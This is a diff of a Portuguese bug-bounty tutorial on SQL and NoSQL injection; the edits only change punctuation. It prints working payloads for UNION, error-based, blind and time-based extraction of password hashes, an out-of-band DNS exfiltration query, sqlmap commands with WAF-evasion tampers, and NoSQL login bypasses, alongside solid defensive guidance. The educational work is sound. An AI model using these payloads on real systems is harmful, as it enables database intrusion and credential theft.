@@ -18,11 +18,11 @@ Você está testando um campo de busca em `app.exemplo.com`. Digita um produto, 
 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version...
 ```
 
-Esse erro é o som de uma porta destrancando. Significa que o texto que **você** digitou foi parar **dentro de uma consulta SQL** sem o devido tratamento — e a partir daí, com os payloads certos, dá pra ler tabela de usuários, hash de senha, dados de cartão, a versão do banco e, em casos extremos, executar comando no servidor. Isso é **SQL Injection (SQLi)**.
+Esse erro é o som de uma porta destrancando. Significa que o texto que **você** digitou foi parar **dentro de uma consulta SQL** sem o devido tratamento. A partir daí, com os payloads certos, dá pra ler tabela de usuários, hash de senha, dados de cartão, a versão do banco e, em casos extremos, executar comando no servidor. Isso é **SQL Injection (SQLi)**.
 
-> Este blog já tem um post sobre SQLi de antes. Aqui a gente **revisita o tema de outra forma, mais didática e autossuficiente**: do "por que acontece" até blind por tempo, diferenças entre MySQL/PostgreSQL/MSSQL, automação com `sqlmap` e a defesa que mata a classe inteira. Se for seu primeiro contato com a série, dá uma olhada antes em [Fundamentos de Web Hacking](/posts/fundamentos-web-hacking/) e [Recon & Discovery](/posts/recon-discovery/) — as ferramentas básicas são apresentadas lá.
+> Este blog já tem um post sobre SQLi de antes. Aqui a gente **revisita o tema de outra forma, mais didática e autossuficiente**: do "por que acontece" até blind por tempo, diferenças entre MySQL/PostgreSQL/MSSQL, automação com `sqlmap` e a defesa que mata a classe inteira. Se for seu primeiro contato com a série, dá uma olhada antes em [Fundamentos de Web Hacking](/posts/fundamentos-web-hacking/) e [Recon & Discovery](/posts/recon-discovery/); as ferramentas básicas são apresentadas lá.
 
-SQLi faz parte de **Injection**, a categoria [A03:2021 do OWASP Top 10](https://owasp.org/Top10/A03_2021-Injection/). É uma das falhas mais antigas da web e, mesmo assim, **continua aparecendo** — principalmente em software legado, painéis administrativos e produtos prontos desatualizados.
+SQLi faz parte de **Injection**, a categoria [A03:2021 do OWASP Top 10](https://owasp.org/Top10/A03_2021-Injection/). É uma das falhas mais antigas da web e, mesmo assim, **continua aparecendo**, principalmente em software legado, painéis administrativos e produtos prontos desatualizados.
 
 ## O que é SQL Injection?
 
@@ -39,11 +39,11 @@ O problema nasce quando o desenvolvedor **gruda** (concatena) o que o usuário d
 $sql = "SELECT * FROM produtos WHERE categoria = '" . $_GET['categoria'] . "'";
 ```
 
-Se você manda `categoria=presentes`, vira a query de cima. Mas se você manda `categoria=presentes'`, a aspa que você inseriu **fecha** a string antes da hora e o resto vira sintaxe SQL quebrada — daí o erro. E se você for esperto, em vez de quebrar, você **completa** o comando do seu jeito.
+Se você manda `categoria=presentes`, vira a query de cima. Mas se você manda `categoria=presentes'`, a aspa que você inseriu **fecha** a string antes da hora e o resto vira sintaxe SQL quebrada: daí o erro. E se você for esperto, em vez de quebrar, você **completa** o comando do seu jeito.
 
-> **Analogia:** imagine um formulário de papel onde o atendente lê o que você escreveu e digita no sistema **sem pensar**. Você escreve no campo "Nome": *"João. E também me transfira todo o saldo da conta 4815."* Um atendente atento ignora a segunda frase — não é um comando, é parte do nome. Um atendente burro **executa** as duas. O banco de dados vulnerável é o atendente burro: ele não distingue **o que é dado** (seu nome) **do que é instrução** (o comando). SQLi explora exatamente essa confusão entre **código e dado**.
+> **Analogia:** imagine um formulário de papel onde o atendente lê o que você escreveu e digita no sistema **sem pensar**. Você escreve no campo "Nome": *"João. E também me transfira todo o saldo da conta 4815."* Um atendente atento ignora a segunda frase: não é um comando, é parte do nome. Um atendente burro **executa** as duas. O banco de dados vulnerável é o atendente burro: ele não distingue **o que é dado** (seu nome) **do que é instrução** (o comando). SQLi explora exatamente essa confusão entre **código e dado**.
 
-A causa raiz é **sempre a mesma**: a aplicação trata entrada do usuário como **código** em vez de **dado**. Guarde essa frase — ela também é a chave da defesa lá no final.
+A causa raiz é **sempre a mesma**: a aplicação trata entrada do usuário como **código** em vez de **dado**. Guarde essa frase, ela também é a chave da defesa lá no final.
 
 ## Por que isso importa (e quanto paga)
 
@@ -52,12 +52,12 @@ SQLi é alto impacto por natureza, porque o banco é onde mora o que vale ouro:
 - **Vazamento em massa:** ler tabelas inteiras de usuários, senhas (hashes), e-mails, CPF, dados de pagamento.
 - **Bypass de autenticação:** entrar como `administrator` sem saber a senha.
 - **Escrita/destruição:** em alguns contextos, alterar ou apagar dados (`UPDATE`/`DELETE`).
-- **RCE:** em SGBDs (Sistemas Gerenciadores de Banco de Dados, ex.: MySQL, PostgreSQL) mal configurados dá pra escalar para execução de comando no SO (ex.: `xp_cmdshell` no MSSQL, escrita de arquivo arbitrário via `INTO OUTFILE` no MySQL — que vira webshell **se** o destino for um diretório executável).
+- **RCE:** em SGBDs (Sistemas Gerenciadores de Banco de Dados, ex.: MySQL, PostgreSQL) mal configurados dá pra escalar para execução de comando no SO (ex.: `xp_cmdshell` no MSSQL, escrita de arquivo arbitrário via `INTO OUTFILE` no MySQL, que vira webshell **se** o destino for um diretório executável).
 
 > 💡 **CVSS**: escala numérica de 0–10 pra severidade da falha (existem v3.1 e v4.0).
 {: .prompt-tip }
 
-Por isso costuma ser classificado como **Alto/Crítico** (veja [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/) pra calibrar o CVSS). Em programas reais, um SQLi confirmado paga tipicamente de **R$1.000** (injeção em alvo de baixo valor, só leitura de metadados) a **R$20.000+** (dump de PII — dados pessoais como CPF, e-mail, cartão; mais no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série) — em escala ou RCE). Um SQLi UNION-based num produto exposto — tipo um painel de inventário desatualizado — fechando em algumas milhares de reais é um cenário bem comum.
+Por isso costuma ser classificado como **Alto/Crítico** (veja [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/) pra calibrar o CVSS). Em programas reais, um SQLi confirmado paga tipicamente de **R$1.000** (injeção em alvo de baixo valor, só leitura de metadados) a **R$20.000+** (dump de PII, dados pessoais como CPF, e-mail, cartão; mais no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série), em escala ou RCE). Um SQLi UNION-based num produto exposto (tipo um painel de inventário desatualizado) fechando em algumas milhares de reais é um cenário bem comum.
 
 > ⚠️ Antes de comemorar: **não rode `sqlmap` agressivo nem dê `DROP`/`DELETE` num alvo de produção.** SQLi mal conduzido corrompe dados de gente de verdade. Voltamos a isso na nota ética.
 
@@ -77,14 +77,14 @@ No backend, o código vulnerável concatena seu input:
 $sql = "SELECT * FROM produtos WHERE categoria = 'presentes''";
 ```
 
-O banco recebe um comando com aspa sobrando, não consegue parsear e devolve erro — que a aplicação, em modo debug, vaza na resposta. **Esse erro confirma que seu input chegou cru na query.** A partir daqui o jogo é: em vez de **quebrar** o comando, **moldá-lo** para que ele faça o que você quiser e te devolva os dados.
+O banco recebe um comando com aspa sobrando, não consegue parsear e devolve erro, que a aplicação, em modo debug, vaza na resposta. **Esse erro confirma que seu input chegou cru na query.** A partir daqui o jogo é: em vez de **quebrar** o comando, **moldá-lo** para que ele faça o que você quiser e te devolva os dados.
 
 Os dois "tijolos" que você vai usar o tempo todo:
 
 1. **Comentário** (`--`, `#`, `/* */`): tudo depois dele é ignorado pelo banco. Serve pra **descartar** o resto da query original (aquela aspa que sobrava, um `AND status=1` chato etc.).
 2. **Operadores lógicos / `UNION`**: pra injetar sua própria condição (`OR 1=1`) ou colar um segundo `SELECT` (UNION) que traz seus dados.
 
-Exemplo clássico — bypass de filtro pra listar tudo:
+Exemplo clássico, bypass de filtro pra listar tudo:
 
 ```
 categoria=presentes' OR 1=1--
@@ -104,7 +104,7 @@ Existem três grandes famílias de SQLi, definidas por **como o dado volta pra v
 
 - **In-band** é o paraíso: você manda o payload e o dado aparece na tela ou no erro. Mais rápido de explorar.
 - **Blind** é quando a aplicação **não mostra** nem dado nem erro, mas o **comportamento** muda conforme sua condição. Mais lento (extrai caractere por caractere), mas igualmente explorável.
-- **Out-of-band** é o último recurso: nenhuma diferença visível na resposta, então você manda o banco "ligar pra fora" (uma consulta DNS para um domínio seu) carregando o dado no subdomínio.
+- **Out-of-band** é o último recurso. Nenhuma diferença visível na resposta, então você manda o banco "ligar pra fora" (uma consulta DNS para um domínio seu) carregando o dado no subdomínio.
 
 Vamos do mais simples (UNION) ao mais sutil (time-based), exatamente nessa ordem.
 
@@ -115,7 +115,7 @@ Antes de injetar, você precisa **mapear onde tem query** (já vimos a base de r
 - **Qualquer parâmetro que filtra/busca dado:** `?id=`, `?categoria=`, `?busca=`, `?ordem=`, `?pagina=`.
 - **Corpo de POST:** formulários de login, busca avançada, filtros de relatório.
 - **Headers que viram query:** `Cookie`, `X-Forwarded-For`, `User-Agent` (apps que logam isso no banco).
-- **Endpoints de produtos prontos desatualizados:** painéis tipo GLPI, sistemas de helpdesk, ERPs legados — onde CVEs de SQLi conhecidos vivem (já falamos de caça a 1-day em [11-security-misconfiguration-cve-hunting.md](/posts/security-misconfiguration-cve-hunting/)).
+- **Endpoints de produtos prontos desatualizados:** painéis tipo GLPI, sistemas de helpdesk, ERPs legados, onde CVEs de SQLi conhecidos vivem (já falamos de caça a 1-day em [11-security-misconfiguration-cve-hunting.md](/posts/security-misconfiguration-cve-hunting/)).
 
 Sinais de que um parâmetro **pode** ser injetável:
 
@@ -132,7 +132,7 @@ Pra encontrar parâmetros escondidos em arquivos JS e histórico, use as ferrame
 echo "app.exemplo.com" | gau | grep -E '\?|&' | grep -iE 'id=|cat=|user=|order=|search=' | sort -u
 ```
 
-> 💡 **Regra de ouro do recon de SQLi:** parâmetros **numéricos** (`?id=1`) e os de **ordenação** (`?order=preco`) são os mais férteis — o de ordenação porque vai pra dentro de `ORDER BY`, onde nem sempre dá pra usar query parametrizada e o dev tende a concatenar.
+> 💡 **Regra de ouro do recon de SQLi:** parâmetros **numéricos** (`?id=1`) e os de **ordenação** (`?order=preco`) são os mais férteis. O de ordenação porque vai pra dentro de `ORDER BY`, onde nem sempre dá pra usar query parametrizada e o dev tende a concatenar.
 
 ## Detecção — confirmando que existe injeção
 
@@ -197,7 +197,7 @@ Método `UNION SELECT NULL` (vai somando NULLs até parar de errar):
 ?id=1' UNION SELECT NULL,NULL,NULL-- -       -> ok  => 3 colunas
 ```
 
-Usamos `NULL` porque ele é compatível com qualquer tipo — evita erro de tipo enquanto você só conta colunas.
+Usamos `NULL` porque ele é compatível com qualquer tipo, evitando erro de tipo enquanto você só conta colunas.
 
 **Passo B — achar uma coluna que "imprime" texto.** Troque os NULLs por marcadores e veja qual aparece na tela:
 
@@ -212,7 +212,7 @@ Usamos `NULL` porque ele é compatível com qualquer tipo — evita erro de tipo
 ?id=1' UNION SELECT NULL,@@version,NULL-- -        (MySQL/MSSQL)
 ```
 
-Depois, dados reais — concatenando colunas pra caber numa coluna só:
+Depois, dados reais, concatenando colunas pra caber numa coluna só:
 
 ```
 ?id=1' UNION SELECT NULL,CONCAT(usuario,':',senha),NULL FROM users-- -    (MySQL)
@@ -222,7 +222,7 @@ Depois, dados reais — concatenando colunas pra caber numa coluna só:
 
 ### Nível 2 — Error-based (dado dentro do erro)
 
-Se a aplicação **vaza mensagens de erro** mas não reflete resultados de UNION, force o dado a aparecer **dentro do erro**. A técnica exata **depende do SGBD** — é por isso que o fingerprint (identificar qual banco é, pela versão/sintaxe) vem antes.
+Se a aplicação **vaza mensagens de erro** mas não reflete resultados de UNION, force o dado a aparecer **dentro do erro**. A técnica exata **depende do SGBD**. É por isso que o fingerprint (identificar qual banco é, pela versão/sintaxe) vem antes.
 
 No **PostgreSQL** (e SQL padrão), a ideia geral do PortSwigger é provocar um erro de conversão de tipo que cospe o valor:
 
@@ -230,15 +230,15 @@ No **PostgreSQL** (e SQL padrão), a ideia geral do PortSwigger é provocar um e
 ' AND CAST((SELECT password FROM users LIMIT 1) AS int)-- -    (PostgreSQL)
 ```
 
-Como a senha (texto) não converte pra inteiro, o banco erra com `invalid input syntax for type integer: "5f4dcc3b..."` — e o **hash aparece no erro**.
+Como a senha (texto) não converte pra inteiro, o banco erra com `invalid input syntax for type integer: "5f4dcc3b..."`, e o **hash aparece no erro**.
 
-> ⚠️ Cuidado: isso **não** funciona no MySQL/MariaDB. Lá, `CAST('texto' AS SIGNED)` não dá erro — ele silenciosamente vira `0`. Como o nosso alvo de exemplo era MariaDB, o vetor error-based clássico ali são as **funções XML** `extractvalue()`/`updatexml()`, que cospem o resultado dentro de uma mensagem `XPATH syntax error`:
+> ⚠️ Cuidado: isso **não** funciona no MySQL/MariaDB. Lá, `CAST('texto' AS SIGNED)` não dá erro: ele silenciosamente vira `0`. Como o nosso alvo de exemplo era MariaDB, o vetor error-based clássico ali são as **funções XML** `extractvalue()`/`updatexml()`, que cospem o resultado dentro de uma mensagem `XPATH syntax error`:
 
 ```
 ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -    (MySQL/MariaDB)
 ```
 
-O `0x7e` é o caractere `~`; o banco tenta interpretar `~5f4dcc3b...` como XPath, falha, e devolve `XPATH syntax error: '~5f4dcc3b...'` — com o hash no erro. (Limite ~32 caracteres por consulta; pagine com `SUBSTRING` se precisar de mais.)
+O `0x7e` é o caractere `~`; o banco tenta interpretar `~5f4dcc3b...` como XPath, falha, e devolve `XPATH syntax error: '~5f4dcc3b...'`, com o hash no erro. (Limite ~32 caracteres por consulta; pagine com `SUBSTRING` se precisar de mais.)
 
 ### Nível 3 — Blind boolean (inferência caractere a caractere)
 
@@ -250,7 +250,7 @@ Sem dado e sem erro na tela, mas a resposta **muda** entre verdadeiro e falso. V
 ...
 ```
 
-Você varre `a`, `b`, `c`... no **1º** caractere. Quando a resposta volta no estado "verdadeiro", achou a 1ª letra. Avança pro 2º (`...,2,1`) e repete. É lento na mão — por isso a gente automatiza (Burp Intruder ou `sqlmap`). PortSwigger ensina a versão com **comparação** (`> 'm'`) pra fazer **busca binária** e reduzir o número de tentativas:
+Você varre `a`, `b`, `c`... no **1º** caractere. Quando a resposta volta no estado "verdadeiro", achou a 1ª letra. Avança pro 2º (`...,2,1`) e repete. É lento na mão, por isso a gente automatiza (Burp Intruder ou `sqlmap`). PortSwigger ensina a versão com **comparação** (`> 'm'`) pra fazer **busca binária** e reduzir o número de tentativas:
 
 ```
 ' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'-- -
@@ -268,11 +268,11 @@ Resposta levou ~5s → o 1º caractere é `a`. Levou <1s → não é. Mesma lóg
 
 > 💡 **WAF**: firewall de aplicação web, um filtro que tenta barrar payloads maliciosos antes de chegarem ao app ([Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série)).
 >
-> Se `SLEEP` estiver bloqueado por WAF, o MySQL tem um plano B: `BENCHMARK(N, expr)` repete uma expressão `N` vezes pra **queimar CPU** e atrasar a resposta — ex.: `BENCHMARK(5000000, MD5('a'))`. Não é um atraso fixo como `SLEEP` (depende da CPU do alvo), mas dá o mesmo sinal de tempo.
+> Se `SLEEP` estiver bloqueado por WAF, o MySQL tem um plano B: `BENCHMARK(N, expr)` repete uma expressão `N` vezes pra **queimar CPU** e atrasar a resposta (ex.: `BENCHMARK(5000000, MD5('a'))`). Não é um atraso fixo como `SLEEP` (depende da CPU do alvo), mas dá o mesmo sinal de tempo.
 
 ### Nível 5 — Out-of-band (OAST)
 
-Último recurso, quando não há diferença na resposta **nem** timing confiável. Você manda o banco fazer uma **requisição externa** (DNS/HTTP) para um domínio que você controla — tipicamente o **Burp Collaborator**. O exemplo oficial do PortSwigger no MSSQL usa `xp_dirtree` pra disparar uma consulta DNS carregando a senha no subdomínio:
+Último recurso, quando não há diferença na resposta **nem** timing confiável. Você manda o banco fazer uma **requisição externa** (DNS/HTTP) para um domínio que você controla, tipicamente o **Burp Collaborator**. O exemplo oficial do PortSwigger no MSSQL usa `xp_dirtree` pra disparar uma consulta DNS carregando a senha no subdomínio:
 
 ```
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');
@@ -298,7 +298,7 @@ O mesmo conceito muda de **sintaxe** conforme o banco. Saber isso é o que separ
 
 ## Automação com sqlmap
 
-Confirmou na mão, entendeu o ponto de injeção? Aí sim o **`sqlmap`** acelera a extração. Ele é a ferramenta open-source padrão pra detectar e explorar SQLi automaticamente (detecta o SGBD, acha colunas, dumpa tabelas). **Use só depois de entender o que ele faz** — e com autorização.
+Confirmou na mão, entendeu o ponto de injeção? Aí sim o **`sqlmap`** acelera a extração. Ele é a ferramenta open-source padrão pra detectar e explorar SQLi automaticamente (detecta o SGBD, acha colunas, dumpa tabelas). **Use só depois de entender o que ele faz**, e com autorização.
 
 ```bash
 # GET: aponta a URL com o parâmetro suspeito e enumera os bancos
@@ -335,11 +335,11 @@ sqlmap -u "https://app.exemplo.com/produtos?id=1" \
   --batch --dbs
 ```
 
-> Os tamper scripts ficam em `/usr/share/sqlmap/tamper/`. `--tamper` recebe uma lista separada por vírgula. Comece **conservador** (`--level=2 --risk=2`) e só suba se necessário — `--risk=3` em produção pode causar estrago.
+> Os tamper scripts ficam em `/usr/share/sqlmap/tamper/`. `--tamper` recebe uma lista separada por vírgula. Comece **conservador** (`--level=2 --risk=2`) e só suba se necessário. `--risk=3` em produção pode causar estrago.
 
 ## NoSQL Injection (o primo dos bancos não-relacionais)
 
-Trocar MySQL por MongoDB **não te livra** de injeção — só muda a forma. Em bancos NoSQL não existe "aspa quebrando string"; o ataque é **injetar operadores de query**. O clássico no MongoDB é o `$ne` ("not equal").
+Trocar MySQL por MongoDB **não te livra** de injeção, só muda a forma. Em bancos NoSQL não existe "aspa quebrando string"; o ataque é **injetar operadores de query**. O clássico no MongoDB é o `$ne` ("not equal").
 
 Imagine um login que monta a busca assim:
 
@@ -358,9 +358,9 @@ Content-Type: application/json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 ```
 
-`{"$ne": null}` casa com **qualquer** registro cujo campo não seja nulo — ou seja, o primeiro usuário do banco, frequentemente o admin. **Bypass de autenticação sem saber a senha.** (Fonte: [OWASP WSTG — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection).)
+`{"$ne": null}` casa com **qualquer** registro cujo campo não seja nulo, ou seja, o primeiro usuário do banco, frequentemente o admin. **Bypass de autenticação sem saber a senha.** (Fonte: [OWASP WSTG — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection).)
 
-E dá pra ir além do bypass: assim como no SQLi blind, operadores de comparação permitem **extrair** a senha caractere a caractere. O `$gt` ("greater than") combinado com `$regex` faz a busca binária — você pergunta "a senha começa com um caractere maior que `m`?" e observa se o login ainda casa:
+E dá pra ir além do bypass: assim como no SQLi blind, operadores de comparação permitem **extrair** a senha caractere a caractere. O `$gt` ("greater than") combinado com `$regex` faz a busca binária: você pergunta "a senha começa com um caractere maior que `m`?" e observa se o login ainda casa:
 
 ```http
 POST /login HTTP/2
@@ -370,7 +370,7 @@ Content-Type: application/json
 {"username": "admin", "password": {"$gt": ""}}
 ```
 
-`{"$gt": ""}` casa com qualquer senha não-vazia (todo valor é "maior que" string vazia) — mais um bypass. Trocando por `{"$regex": "^a.*"}` e variando o prefixo, você infere a senha letra a letra, exatamente como no boolean-based.
+`{"$gt": ""}` casa com qualquer senha não-vazia (todo valor é "maior que" string vazia), mais um bypass. Trocando por `{"$regex": "^a.*"}` e variando o prefixo, você infere a senha letra a letra, exatamente como no boolean-based.
 
 > A defesa é a mesma filosofia do SQL: **valide tipos** (esperava string? recuse objeto) e nunca jogue o corpo do request cru no filtro.
 
@@ -407,16 +407,16 @@ Content-Type: text/html
 ?cycle=1 UNION ALL SELECT 1,(@@version)-- -&only_tasks=1
 ```
 
-Resposta: `10.1.47-MariaDB-0+deb9u1`. Confirmado: **MariaDB** (dialeto MySQL), versão antiga. E `(user())` retorna o usuário do banco — útil pra avaliar privilégios.
+Resposta: `10.1.47-MariaDB-0+deb9u1`. Confirmado: **MariaDB** (dialeto MySQL), versão antiga. E `(user())` retorna o usuário do banco, útil pra avaliar privilégios.
 
-**O que a tela do Burp mostraria:** painel Request/Response lado a lado; na Response, o valor injetado (`appdb`, depois a string de versão) aparecendo no corpo HTML, destacado, onde antes vinha um dado da tarefa. O ponto-chave é o **`UNION ALL SELECT 1,(...)`** no parâmetro `cycle` — é ali que seu segundo SELECT entra.
+**O que a tela do Burp mostraria:** painel Request/Response lado a lado; na Response, o valor injetado (`appdb`, depois a string de versão) aparecendo no corpo HTML, destacado, onde antes vinha um dado da tarefa. O ponto-chave é o **`UNION ALL SELECT 1,(...)`** no parâmetro `cycle`: é ali que seu segundo SELECT entra.
 
-**Passo 3 — report.** Título: `[SQLi] - UNION-based SQL Injection em /scripts/unlock_tasks.php (parâmetro cycle)`. Resumo focado no risco: *"qualquer usuário não autenticado consegue executar SQL arbitrário, extraindo nome do banco, versão e — com `information_schema` — qualquer tabela, incluindo credenciais"*. PoC com os dois payloads (`database()` e `@@version`), prints do Burp, e **pare por aí**: provar leitura de metadados já demonstra impacto crítico sem dumpar PII real. Severidade **Crítica**:
+**Passo 3 — report.** Título: `[SQLi] - UNION-based SQL Injection em /scripts/unlock_tasks.php (parâmetro cycle)`. Resumo focado no risco: *"qualquer usuário não autenticado consegue executar SQL arbitrário, extraindo nome do banco, versão e (com `information_schema`) qualquer tabela, incluindo credenciais"*. PoC com os dois payloads (`database()` e `@@version`), prints do Burp, e **pare por aí**: provar leitura de metadados já demonstra impacto crítico sem dumpar PII real. Severidade **Crítica**:
 
-- **CVSS v3.1:** `9.8` — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (rede, sem autenticação, sem interação; o SGBD permite leitura e potencial escrita/RCE).
-- **CVSS v4.0:** `9.3` — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`.
+- **CVSS v3.1:** `9.8`, vetor `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (rede, sem autenticação, sem interação; o SGBD permite leitura e potencial escrita/RCE).
+- **CVSS v4.0:** `9.3`, vetor `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`.
 
-Se você só comprovou **leitura** (sem demonstrar escrita), seja honesto e baixe o impacto de integridade/disponibilidade — vira algo como v3.1 `7.5` (`C:H/I:N/A:N`). Calibre conforme o que **você provou**, não o que é teoricamente possível. (Como estruturar isso bem: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) · calibrar CVSS: [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/).)
+Se você só comprovou **leitura** (sem demonstrar escrita), seja honesto e baixe o impacto de integridade/disponibilidade: vira algo como v3.1 `7.5` (`C:H/I:N/A:N`). Calibre conforme o que **você provou**, não o que é teoricamente possível. (Como estruturar isso bem: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/) · calibrar CVSS: [Severidade, Impacto e Triagem](/posts/severidade-impacto-triagem/).)
 
 ## Defesa em camadas
 
@@ -424,7 +424,7 @@ A correção **definitiva** ataca a raiz: nunca deixe o input do usuário ser in
 
 ### 1. Queries parametrizadas / Prepared Statements (a defesa nº 1)
 
-Em vez de **concatenar**, você manda a query com **marcadores** (`?` ou `:nome`) e passa os valores **separadamente**. O driver garante que o valor é tratado como **dado**, nunca como SQL — independente do que o usuário digitou. (Fonte: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).)
+Em vez de **concatenar**, você manda a query com **marcadores** (`?` ou `:nome`) e passa os valores **separadamente**. O driver garante que o valor é tratado como **dado**, nunca como SQL, independente do que o usuário digitou. (Fonte: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).)
 
 ```php
 // ❌ ERRADO (PHP) — concatena input na query
@@ -455,15 +455,15 @@ cur.execute("SELECT * FROM users WHERE id = %s", (request.args['id'],))
 
 > Repare: nas versões CORRETAS, a string da query é **fixa**. Não importa se o usuário mandar `1' OR 1=1--`; isso vira o **valor literal** procurado na coluna `id`, e a busca simplesmente não acha nada. Código e dado ficam em compartimentos separados.
 
-> ⚠️ **Prepared statement não é bala de prata — protege o VALOR, não o identificador.** O placeholder (`?`, `:id`, `%s`) blinda **valores** (o que vai em `WHERE x = ?`). Mas **nome de coluna, nome de tabela e `ORDER BY`** não podem ser parametrizados — se você os concatena a partir de input do usuário, a injeção volta (use allowlist, abaixo). E há um caso mais sutil: pesquisa da [Slcyber/Assetnote](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/) mostrou dar pra **confundir o parser do PDO** (driver do PHP) — injetando um *placeholder* falso seguido de **byte nulo** (`%00`), parte do payload passa a ser interpretada como SQL em vez de dado literal, viabilizando SQLi **mesmo com prepared statement**, sobretudo quando há SQL dinâmico. Visto na prática na máquina **CyberWaf** (HackingClub): o endpoint usava PDO, mas o **nome da coluna** vinha do usuário e o parser foi confundido com algo como
+> ⚠️ **Prepared statement não é bala de prata — protege o VALOR, não o identificador.** O placeholder (`?`, `:id`, `%s`) blinda **valores** (o que vai em `WHERE x = ?`). Mas **nome de coluna, nome de tabela e `ORDER BY`** não podem ser parametrizados: se você os concatena a partir de input do usuário, a injeção volta (use allowlist, abaixo). E há um caso mais sutil: pesquisa da [Slcyber/Assetnote](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/) mostrou dar pra **confundir o parser do PDO** (driver do PHP). Injetando um *placeholder* falso seguido de **byte nulo** (`%00`), parte do payload passa a ser interpretada como SQL em vez de dado literal, viabilizando SQLi **mesmo com prepared statement**, sobretudo quando há SQL dinâmico. Visto na prática na máquina **CyberWaf** (HackingClub): o endpoint usava PDO, mas o **nome da coluna** vinha do usuário e o parser foi confundido com algo como
 > ```
 > ?name=x` FROM (SELECT table_name AS `'x` FROM information_schema.tables)y;#&verify=\?#%00
 > ```
-> enumerando todas as tabelas apesar do prepared statement. **Lição:** parametrize **sempre**, mas onde precisar de identificador dinâmico, valide por **allowlist estrita** — não confie só no driver.
+> enumerando todas as tabelas apesar do prepared statement. **Lição:** parametrize **sempre**, mas onde precisar de identificador dinâmico, valide por **allowlist estrita**. Não confie só no driver.
 
 ### 2. Allowlist onde não dá pra parametrizar
 
-Nome de tabela, nome de coluna e direção de `ORDER BY` **não** podem ser bind. Aí use uma **lista branca** — mapeie o input pra um valor seguro conhecido:
+Nome de tabela, nome de coluna e direção de `ORDER BY` **não** podem ser bind. Aí use uma **lista branca**, mapeando o input pra um valor seguro conhecido:
 
 ```php
 // ✅ ORDER BY via allowlist — o input só escolhe entre opções fixas
@@ -487,21 +487,21 @@ User::whereRaw("email = '" . $request->email . "'")->first();
 
 - **Least privilege:** a conta da aplicação no banco deve ter **só** o necessário (sem `DROP`, `FILE`, sem ser `root`). Assim, mesmo que vaze um SQLi, o estrago é limitado.
 - **Validação de tipo:** se o parâmetro é numérico, **rejeite** o que não for número antes de chegar ao banco.
-- **Erros genéricos:** desligue mensagens de erro detalhadas em produção — elas alimentam o error-based.
+- **Erros genéricos:** desligue mensagens de erro detalhadas em produção, pois elas alimentam o error-based.
 - **WAF:** ajuda a barrar payloads óbvios, mas é **bypassável** (vide `--tamper`). É camada extra, **nunca** a defesa principal.
 
-> ❌ **O que NÃO basta:** escapar aspas na mão (frágil e bypassável — a própria OWASP **desencoraja**), confiar só no WAF, esconder a mensagem de erro mas manter a query concatenada, ou validar no frontend.
+> ❌ **O que NÃO basta:** escapar aspas na mão (frágil e bypassável, a própria OWASP **desencoraja**), confiar só no WAF, esconder a mensagem de erro mas manter a query concatenada, ou validar no frontend.
 
 ## Ferramentas + labs legais
 
-- **Burp Suite** — Repeater (testar payloads), Intruder (automatizar inferência blind), Collaborator (OAST). Apresentado nos Fundamentos.
-- **sqlmap** — automação de detecção/extração (use com cabeça e autorização).
+- **Burp Suite**: Repeater (testar payloads), Intruder (automatizar inferência blind), Collaborator (OAST). Apresentado nos Fundamentos.
+- **sqlmap**: automação de detecção/extração (use com cabeça e autorização).
 - **Labs pra praticar (autorizados):**
   - [PortSwigger Web Security Academy — SQL injection](https://portswigger.net/web-security/sql-injection) (a melhor fonte gratuita, com labs por tipo)
   - [DVWA](https://github.com/digininja/DVWA) e [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) (rodam local)
   - TryHackMe, HackTheBox, HackingClub
 
-> 🔗 **WriteUp prático (ponta a ponta):** quer ver SQLi numa caçada real e completa — recon → SQLi → extração do banco → shell → escalação de privilégio? A máquina **Lion** do HackingClub está resolvida passo a passo em [SQL Injection da teoria à prática (máquina Lion)](/posts/sql-injection-definitivo/). Este capítulo é a *metodologia*; o WriteUp é a *execução*.
+> 🔗 **WriteUp prático (ponta a ponta):** quer ver SQLi numa caçada real e completa, recon → SQLi → extração do banco → shell → escalação de privilégio? A máquina **Lion** do HackingClub está resolvida passo a passo em [SQL Injection da teoria à prática (máquina Lion)](/posts/sql-injection-definitivo/). Este capítulo é a *metodologia*; o WriteUp é a *execução*.
 
 ## Checklist do caçador
 
@@ -511,7 +511,7 @@ User::whereRaw("email = '" . $request->email . "'")->first();
 - [ ] Se sem diferença visível, testei **time-based** (`SLEEP`/`pg_sleep`/`WAITFOR`).
 - [ ] **UNION:** achei o nº de colunas (`ORDER BY` / `UNION SELECT NULL`) e a coluna refletida.
